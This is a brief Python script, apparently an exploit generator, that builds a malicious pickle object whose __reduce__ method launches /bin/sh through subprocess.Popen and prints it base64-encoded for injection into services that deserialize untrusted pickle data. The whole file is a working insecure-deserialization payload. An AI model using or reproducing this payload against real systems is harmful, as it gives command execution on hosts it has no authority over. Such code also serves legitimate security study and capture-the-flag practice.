import _pickle as cPickle
import subprocess
import base64

class HydeCode4Sec(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))

print(base64.b64encode(cPickle.dumps(HydeCode4Sec())))